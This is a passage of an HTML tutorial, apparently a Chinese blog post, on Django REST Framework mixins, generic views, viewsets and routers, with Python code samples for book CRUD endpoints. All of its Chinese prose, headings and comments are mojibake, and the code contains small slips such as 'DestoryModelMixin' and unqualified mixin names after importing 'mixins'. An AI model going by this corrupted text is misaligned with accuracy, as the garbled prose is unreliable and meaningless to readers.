id="‰ΩøÁî®">‰ΩøÁî®</h2><ul><li>ÁªßÊâøÂ∑•ÂÖ∑Á±ªÂèØ‰ª•ÁÆÄÂåñËØ∑Ê±ÇÂáΩÊï∞ÁöÑÂÆûÁé∞‰ΩìÔºå‰ΩÜÊòØÂøÖÈ°ªÁªßÊâø<code>GenericAPIView</code>ÔºåÈúÄË¶Å<code>GenericAPIView</code>Á±ªÊèê‰æõÂ∫èÂàóÂåñÂô®‰∏éÊï∞ÊçÆÂ∫ìÊü•ËØ¢ÁöÑÊñπÊ≥ï(ËßÅ‰∏äÊñπ<code>GenericAPIView</code>Âü∫Á±ªÁü•ËØÜÁÇπ)</li><li>Â∑•ÂÖ∑Á±ªÁöÑÂ∑•ÂÖ∑ÊñπÊ≥ïËøîÂõûÂÄºÈÉΩÊòØ<code>Response</code>Á±ªÂûãÂØπË±°ÔºåÂ¶ÇÊûúË¶ÅÊ†ºÂºèÂåñÊï∞ÊçÆÊ†ºÂºèÂÜçËøîÂõûÁªôÂâçÂè∞ÔºåÂèØ‰ª•ÈÄöËøá<code>response.data</code>ÊãøÂà∞Â∑•ÂÖ∑ÊñπÊ≥ïËøîÂõûÁöÑ<code>Response</code>Á±ªÂûãÂØπË±°ÁöÑÂìçÂ∫îÊï∞ÊçÆ</li></ul><h2 id="‰∫îÂ§ßÊ®°ÂûãÂ∑•ÂÖ∑Á±ª">‰∫îÂ§ßÊ®°ÂûãÂ∑•ÂÖ∑Á±ª</h2><h3 id="listmodelmixin-Áæ§Êü•"><code>ListModelMixin</code> Áæ§Êü•</h3><ul><li>ÂàóË°®ËßÜÂõæÊâ©Â±ïÁ±ªÔºåÊèê‰æõ<code>list</code>ÊñπÊ≥ïÂø´ÈÄüÂÆûÁé∞Êü•ËØ¢ËßÜÂõæ</li><li>ËøîÂõû<code>200</code>Áä∂ÊÄÅÁ†Å</li><li>Èô§‰∫ÜÊü•ËØ¢ÔºåËØ•<code>list</code>ÊñπÊ≥ï‰ºöÂØπÊï∞ÊçÆËøõË°åËøáÊª§ÂíåÂàÜÈ°µ</li></ul><h3 id="createmodelmixin-ÂçïÂ¢û"><code>CreateModelMixin</code> ÂçïÂ¢û</h3><ul><li>ÂàõÂª∫ËßÜÂõæÊâ©Â±ïÁ±ªÔºåÊèê‰æõ<code>create</code>ÊñπÊ≥ïÂø´ÈÄüÂàõÂª∫ËµÑÊ∫êÁöÑËßÜÂõæÔºåÊàêÂäüËøîÂõû<code>201</code>ÁöÑÁä∂ÊÄÅÁ†Å</li><li><strong>Ê≤°ÊúâÁæ§Â¢ûÁöÑÊñπÊ≥ïÔºåÈúÄË¶ÅËá™Â∑±ÊâãÂä®ÂÜô</strong></li></ul><h3 id="retrievemodelmixin-ÂçïÊü•"><code>RetrieveModelMixin</code> ÂçïÊü•</h3><ul><li>ËØ¶ÊÉÖËßÜÂõæÊâ©Â±ïÁ±ªÔºåÊèê‰æõ<code>retrieve</code>ÊñπÊ≥ïÔºåÂèØ‰ª•Âø´ÈÄüÂÆûÁé∞ËøîÂõû‰∏Ä‰∏™Â≠òÂú®ÁöÑÊï∞ÊçÆÂØπË±°</li></ul><h3 id="updatemodelmixin-Êõ¥Êñ∞‰øÆÊîπ"><code>UpdateModelMixin</code> Êõ¥Êñ∞/‰øÆÊîπ</h3><ul><li>Êõ¥Êñ∞ËßÜÂõæÊâ©Â±ïÁ±ªÔºåÊèê‰æõ<code>update</code>ÊñπÊ≥ïÔºåÂèØ‰ª•Âø´ÈÄüÂÆûÁé∞Êõ¥Êñ∞‰∏Ä‰∏™Â≠òÂú®ÁöÑÊï∞ÊçÆÂØπË±°ÔºåÂêåÊó∂‰πüÊèê‰æõ<code>partial_update</code>ÊñπÊ≥ïÔºåÂèØ‰ª•ÂÆûÁé∞Â±ÄÈÉ®Êõ¥Êñ∞</li><li><strong>Âè™ÊúâÂçïÊï¥‰ΩìÊîπÂíåÂçïÂ±ÄÈÉ®ÊîπÔºåÊ≤°ÊúâÁæ§Êï¥‰ΩìÊîπÂíåÁæ§Â±ÄÈÉ®Êîπ</strong></li></ul><h3 id="destorymodelmixin-Âà†Èô§"><code>DestoryModelMixin</code> Âà†Èô§</h3><ul><li>Âà†Èô§ËßÜÂõæÊâ©Â±ïÁ±ªÔºåÊèê‰æõ<code>destory</code>ÊñπÊ≥ïÔºåÂèØ‰ª•Âø´ÈÄüÂÆûÁé∞Âà†Èô§‰∏Ä‰∏™Â≠òÂú®Êï∞ÊçÆÂØπË±°</li><li>‰∏ÄËà¨‰∏çÊÄé‰πàÁî®Âà∞ÔºåÂõ†‰∏∫ÂÆûÈôÖÂºÄÂèë‰∏≠Âπ∂‰∏ç‰ºöÁúüÁöÑÂà†Èô§Êï∞ÊçÆÔºåËÄåÊòØ‰øÆÊîπÊòØÂê¶ÂèØÁî®ÁöÑÊ†áËÆ∞</li></ul><h2 id="Á§∫‰æã‰ª£Á†Å-2">Á§∫‰æã‰ª£Á†Å</h2><h3 id="ËßÜÂõæÂ±Ç-views.py-1">ËßÜÂõæÂ±Ç <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.mixins <span class="keyword">import</span> ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookMixinGenericAPIView</span><span class="params">(ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin, GenericAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># GenericAPIViewÊèê‰æõÁöÑÂ∫èÂàóÂåñÂô®ÂíåÊü•ËØ¢ÁöÑÊï∞ÊçÆ</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂçïÊü•ÂíåÁæ§Êü•</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'pk'</span> <span class="keyword">in</span> kwargs:</span><br><span class="line">            <span class="comment"># ÂçïÊü•  RetrieveModelMixinÊñπÊ≥ï</span></span><br><span class="line">            response = self.retrieve(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># mixinsÊèê‰æõÁöÑlistÊñπÊ≥ïÁöÑÂìçÂ∫îÂØπË±°ÊòØResponseÔºåÂ∞ÜËØ•ÂØπË±°Ê†ºÂºèÂåñ‰∏∫Ëá™ÂÆö‰πâÁöÑAPIResponse</span></span><br><span class="line">            response = self.list(request, *args, **kwargs)  <span class="comment"># Áæ§Êü• ListModelMixin</span></span><br><span class="line">        <span class="comment"># responseÁöÑÊï∞ÊçÆÈÉΩÂ≠òÊîæÂú®response.data‰∏≠</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂçïÂ¢û</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.create(request, *args, **kwargs)  <span class="comment"># CreateModelMixinÊñπÊ≥ï</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂçïÊï¥‰Ωì‰øÆÊîπ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.update(request, *args, **kwargs)  <span class="comment"># UpdateModelMixin</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂçïÂ±ÄÈÉ®‰øÆÊîπ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.partial_update(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br></pre></td></tr></table></figure><h3 id="Ë∑ØÁî±Â±Ç-urls.py-1">Ë∑ØÁî±Â±Ç <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v3/books/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v3/books/&lt;pk&gt;/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="xxxapiview---ÂäüËÉΩÊÄßÂ≠êËßÜÂõæÁ±ª">xxxAPIView - ÂäüËÉΩÊÄßÂ≠êËßÜÂõæÁ±ª</h1><p>ÂäüËÉΩÊÄßÂ≠êËßÜÂõæÁ±ªÁªßÊâø‰∫Ü<code>GenericAPIView</code>ÂíåÂêÑÁßç<code>Mixins</code>Â∑•ÂÖ∑Á±ª</p><ol type="1"><li>ÂäüËÉΩÊÄßËßÜÂõæÁ±ªÈÉΩÊòØ<code>GenericAPIView</code>ÁöÑÂ≠êÁ±ªÔºå‰∏î‰∏çÂêåÁöÑÂ≠êÁ±ªÁªßÊâø‰∫Ü‰∏çÂêåÁöÑÂ∑•ÂÖ∑Á±ª</li><li>Â∑•ÂäüËÉΩÊÄßËßÜÂõæÁ±ªÁöÑÂäüËÉΩÂèØ‰ª•Êª°Ë∂≥ÈúÄÊ±ÇÔºåÂè™ÈúÄË¶ÅÁªßÊâøÂ∑•ÂÖ∑ËßÜÂõæÔºåÂπ∂‰∏îÊèê‰æõ<code>queryset</code>‰∏é<code>serializer_class</code>Âç≥ÂèØ</li></ol><h2 id="ÂêÑÂ§ßÂäüËÉΩÂ≠êËßÜÂõæÁ±ª">ÂêÑÂ§ßÂäüËÉΩÂ≠êËßÜÂõæÁ±ª</h2><p>‰∏ÄË°®ËÉúÂçÉË®ÄÔºö</p><table><colgroup><col style="width: 25%" /><col style="width: 25%" /><col style="width: 25%" /><col style="width: 25%" /></colgroup><thead><tr class="header"><th>ËßÜÂõæ</th><th>‰ΩúÁî®</th><th>ËØ∑Ê±ÇÁ±ªÂûã</th><th>Áà∂Á±ª</th></tr></thead><tbody><tr class="odd"><td>ListAPIView</td><td>Êü•ËØ¢Â§öÊù°Êï∞ÊçÆ</td><td>get</td><td>GenericAPIView <br/> ListModelMixin</td></tr><tr class="even"><td>CreateAPIView</td><td>Êñ∞Â¢û‰∏ÄÊù°Êï∞ÊçÆ</td><td>post</td><td>GenericAPIView <br/> CreateModelMixin</td></tr><tr class="odd"><td>RetrieveAPIView</td><td>Êü•ËØ¢‰∏ÄÊù°Êï∞ÊçÆ</td><td>get</td><td>GenericAPIView <br/> RetrieveModelMixin</td></tr><tr class="even"><td>UpdateAPIView</td><td>‰øÆÊîπ‰∏ÄÊù°Êï∞ÊçÆ</td><td>put <br/> patch</td><td>GenericAPIView <br/>UpdateModelMixin</td></tr><tr class="odd"><td>DestroyAPIView</td><td>Âà†Èô§‰∏ÄÊù°Êï∞ÊçÆ</td><td>delete</td><td>GenericAPIView <br/> DestroyModelMixin</td></tr><tr class="even"><td>RetrieveUpdateAPIView</td><td>ÂçïÊü• <br/> Êõ¥Êñ∞‰∏ÄÊù°Êï∞ÊçÆ</td><td>get<br/>put<br/>patch</td><td>GenericAPIView<br/>RetrieveModelMixin<br/>UpdateModelMixin</td></tr><tr class="odd"><td>RetrieveUpdateDestroyAPIView</td><td>ÂçïÊü•<br/>Êõ¥Êñ∞<br/>Âà†Èô§‰∏ÄÊù°Êï∞ÊçÆ</td><td>get<br/>put<br/>patch<br/>delete</td><td>GenericAPIView<br/> RetrieveModelMixin<br/>UpdateModelMixin<br/>DestroyModelMixin</td></tr><tr class="even"><td>ListCreateAPIView</td><td>Áæ§Êü•<br/>Êõ¥Êñ∞‰∏ÄÊù°</td><td>get<br/>post</td><td>GenericAPIView<br/>ListModelMixin<br/>mixins.CreateModelMixin</td></tr></tbody></table><h2 id="Á§∫‰æã‰ª£Á†Å-3">Á§∫‰æã‰ª£Á†Å</h2><h3 id="ËßÜÂõæÂ±Ç-views.py-2">ËßÜÂõæÂ±Ç <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListCreateAPIView, UpdateAPIView</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListCreatePIView</span><span class="params">(ListCreateAPIView, UpdateAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br></pre></td></tr></table></figure><h3 id="Ë∑ØÁî±Â±Ç-urls.py-2">Ë∑ØÁî±Â±Ç <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v4/books/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">    path(<span class="string">'v4/books/&lt;pk&gt;/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="xxxviewset---ËßÜÂõæÈõÜ">xxxViewset - ËßÜÂõæÈõÜ</h1><h2 id="Â∏∏Áî®ËßÜÂõæÈõÜÁà∂Á±ª">Â∏∏Áî®ËßÜÂõæÈõÜÁà∂Á±ª</h2><h3 id="viewsetmixin">ViewSetMixin</h3><p><code>ViewSetMixin</code>‰∏ªË¶ÅÊòØËá™ÂÆö‰πâ‰∫Ü<code>as_view</code>ÊñπÊ≥ïÔºå‰ΩøÂèØ‰ª•ÈÄöËøáÂÖ∂ÂèÇÊï∞ÊåáÂÆö <code>HTTP_METHOD</code>‰∏éÂáΩÊï∞ÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÔºåÂ¶Ç <code>view = MyViewSet.as_view({'get': 'list', 'post': 'create'})</code></p><h3 id="viewset">ViewSet</h3><p>ÁªßÊâøËá™<code>APIView</code>Âíå<code>ViewSetMixin</code>ÔºåÊ≤°ÊúâÊèê‰æõ‰ªª‰ΩïÊñπÊ≥ïÔºåÈúÄË¶ÅËá™Â∑±ÂÜô</p><h3 id="genericviewset">GenericViewSet</h3><p>ÁªßÊâø<code>GenericAPIView</code>Âíå<code>ViewSetMixin</code>ÔºåÂÖ∂‰∏≠<code>GenericAPIView</code>Êèê‰æõ‰∫ÜÂü∫Á°ÄÊñπÊ≥ïÔºåÂèØ‰ª•Áõ¥Êé•Êê≠ÈÖç<code>Mixin</code>Êâ©Â±ïÁ±ª‰ΩøÁî®ÔºåÂõ†Ê≠§ÊØîËæÉÂ∏∏Áî®</p><h3 id="modelviewset">ModelViewSet„ÄÄ„ÄÄ</h3><p>ÁªßÊâø<code>GenericViewset</code>Ôºå‰ΩÜÂêåÊó∂‰πüÂåÖÊã¨<code>ListModelMixin</code>„ÄÅ<code>CreateModelMixin</code>Á≠â<code>mixin</code>Êâ©Â±ïÁ±ª</p><h2 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h2><ol type="1"><li>ËßÜÂõæÈõÜÈÉΩÊòØÈªòËÆ§‰ºòÂÖàÁªßÊâø<code>ViewSetMixin</code>Á±ªÔºåÂÜçÁªßÊâø‰∏Ä‰∏™ËßÜÂõæÁ±ªÔºà<code>GenericAPIView</code>Êàñ<code>APIView</code>Ôºâ</li><li><code>ViewSetMixin</code>Êèê‰æõ‰∫ÜÈáçÂÜôÁöÑ<code>as_view()</code>ÊñπÊ≥ïÔºåÁªßÊâøËßÜÂõæÈõÜÁöÑËßÜÂõæÁ±ªÔºåÈÖçÁΩÆË∑ØÁî±Êó∂Ë∞ÉÁî®<code>as_view()</code>ÂøÖÈ°ª‰º†ÂÖ• ËØ∑Ê±ÇÂêç-ÂáΩÊï∞Âêç Êò†Â∞ÑÂÖ≥Á≥ªÂ≠óÂÖ∏</li></ol><p>‰æãÂ¶Ç:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(<span class="string">'v5/books/'</span>, views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br></pre></td></tr></table></figure><p>Ë°®Á§∫<code>get</code>ËØ∑Ê±Ç‰ºö‰∫§Áªô<code>my_get_list</code>ËßÜÂõæÂáΩÊï∞Â§ÑÁêÜ</p><h2 id="genericviewset-Á§∫‰æã‰ª£Á†Å">GenericViewSet Á§∫‰æã‰ª£Á†Å</h2><h3 id="Ë∑ØÁî±Â±Ç-urls.py-3">Ë∑ØÁî±Â±Ç urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">       <span class="comment"># ViewÁöÑas_view()ÔºöÂ∞ÜgetËØ∑Ê±ÇÊò†Â∞ÑÂà∞ËßÜÂõæÁ±ªÁöÑgetÊñπÊ≥ï</span></span><br><span class="line">    <span class="comment"># ViewSetÁöÑas_view(&#123;'get': 'my_get_list'&#125;)ÔºöÂ∞ÜgetËØ∑Ê±ÇÊò†Â∞ÑÂà∞ËßÜÂõæÁ±ªÁöÑmy_get_listÊñπÊ≥ï</span></span><br><span class="line">    path(<span class="string">'v5/books/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v5/books/&lt;pk&gt;/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_obj'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="ËßÜÂõæÂ±Ç-views.py-3">ËßÜÂõæÂ±Ç views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> GenericViewSet</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> mixins  <span class="comment">#Â∑•ÂÖ∑ÈõÜ ÂèØ‰ª•‰ΩøÁî®list,retrieveÁ≠âÊñπÊ≥ï</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericViewSet</span><span class="params">(RetrieveModelMixin, ListModelMixin, GenericViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.list(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_obj</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.retrieve(request, *args, **kwargs)</span><br></pre></td></tr></table></figure><h2 id="genericviewset‰∏éviewset"><code>GenericViewSet</code>‰∏é<code>ViewSet</code></h2><h3 id="ÂºÇÂêå">ÂºÇÂêå</h3><ol type="1"><li><code>GenericViewSet</code>Âíå<code>ViewSet</code>ÈÉΩÁªßÊâø‰∫Ü<code>ViewSetMixin</code>Ôºå<code>as_view</code>ÈÉΩÂèØ‰ª•ÈÖçÁΩÆ ËØ∑Ê±Ç-ÂáΩÊï∞ Êò†Â∞Ñ</li><li><code>GenericViewSet</code>ÁªßÊâøÁöÑÊòØ<code>GenericAPIView</code>ËßÜÂõæÁ±ªÔºåÁî®Êù•ÂÆåÊàêÊ†áÂáÜÁöÑ <code>model</code> Á±ªÊìç‰ΩúÊé•Âè£</li><li><code>ViewSet</code>ÁªßÊâøÁöÑÊòØ<code>APIView</code>ËßÜÂõæÁ±ªÔºåÁî®Êù•ÂÆåÊàê‰∏çÈúÄË¶Å <code>model</code> Á±ªÂèÇ‰∏éÔºåÊàñÊòØÈùûÊ†áÂáÜÁöÑ <code>model</code> Á±ªÊìç‰ΩúÊé•Âè£ÔºåÂ¶Ç<ul><li><code>post</code>ËØ∑Ê±ÇÂú®Ê†áÂáÜÁöÑ <code>model</code> Á±ªÊìç‰Ωú‰∏ãÂ∞±ÊòØÊñ∞Â¢ûÊé•Âè£ÔºåÁôªÈôÜÁöÑ<code>post</code>‰∏çÊª°Ë∂≥„ÄÇÁôªÈôÜÁöÑpostËØ∑Ê±ÇÔºåÂπ∂‰∏çÊòØÂÆåÊàêÊï∞ÊçÆÁöÑÊñ∞Â¢ûÔºåÂè™ÊòØÁî®postÊèê‰∫§Êï∞ÊçÆÔºåÂæóÂà∞ÁöÑÁªìÊûú‰πü‰∏çÊòØÁôªÈôÜÁöÑÁî®Êà∑‰ø°ÊÅØÔºåËÄåÊòØÁôªÈôÜÁöÑËÆ§ËØÅ‰ø°ÊÅØ</li><li><code>post</code>ËØ∑Ê±ÇÈ™åËØÅÁ†ÅÁöÑÊé•Âè£Ôºå‰∏çÈúÄË¶Å <code>model</code> Á±ªÁöÑÂèÇ‰∏é</li></ul></li></ol><h3 id="Ê∫êÁ†Å">Ê∫êÁ†Å</h3><ul><li>GenericViewSet</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># viewsets.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericViewSet</span><span class="params">(ViewSetMixin, generics.GenericAPIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The GenericViewSet class does not provide any actions by default,</span></span><br><span class="line"><span class="string">    but does include the base set of generic view behavior, such as</span></span><br><span class="line"><span class="string">    the `get_object` and `get_queryset` methods.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># generics.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericAPIView</span><span class="params">(views.APIView)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><ul><li>ViewSet</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewSet</span><span class="params">(ViewSetMixin, views.APIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The base ViewSet class does not provide any actions by default.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><h2 id="modelviewset-Á§∫‰æã‰ª£Á†Å">ModelViewSet Á§∫‰æã‰ª£Á†Å</h2><h3 id="Ë∑ØÁî±Â±Ç-urls.py-4">Ë∑ØÁî±Â±Ç urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v6/books/'</span>,</span><br><span class="line">         views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'list'</span>, <span class="string">'post'</span>: <span class="string">'create'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v6/books/&lt;pk&gt;/'</span>, </span><br><span class="line">        views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'retrieve'</span>, <span class="string">'put'</span>: <span class="string">'update'</span>, <span class="string">'patch'</span>: <span class="string">'partial_update'</span>, <span class="string">'delete'</span>: <span class="string">'destroy'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="ËßÜÂõæÂ±Ç-views.py-4">ËßÜÂõæÂ±Ç views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelViewSet</span><span class="params">(ModelViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Âà†‰∏çÊòØÊï∞ÊçÆÂ∫ìÔºåËÄåÊòØËØ•ËÆ∞ÂΩï‰∏≠ÁöÑ‰øÆÊîπis_deleteÁöÑÂÄºÔºåÂõ†Ê≠§ÈáçÂÜôÈªòËÆ§ÁöÑdestroyÂáΩÊï∞</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        instance = self.get_object()  <span class="comment"># type: models.Book</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> instance:</span><br><span class="line">            <span class="keyword">return</span> APIResponse(<span class="number">1</span>, <span class="string">'Âà†Èô§Â§±Ë¥•'</span>)  <span class="comment"># ÂÆûÈôÖÊìç‰ΩúÔºåÂú®Ê≠§‰πãÂâçÂ∞±ÂÅö‰∫ÜÂà§Êñ≠</span></span><br><span class="line">        instance.is_delete = <span class="literal">True</span></span><br><span class="line">        instance.save()</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'Âà†Èô§ÊàêÂäü'</span>)</span><br></pre></td></tr></table></figure><h1 id="Ë∑ØÁî±ÁªÑ‰ª∂">Ë∑ØÁî±ÁªÑ‰ª∂</h1><p>Âõ†‰∏∫ÂÖ∑ÊúâÂ±ÄÈôêÊÄßÔºåÊâÄ‰ª•Âú®ÂºÄÂèëÂ§çÊùÇÊé•Âè£Êó∂Âπ∂‰∏çÊòØÈ¶ñÈÄâ„ÄÇ</p><p>Á§∫‰æã‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> SimpleRouter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">router = SimpleRouter()</span><br><span class="line"><span class="comment"># 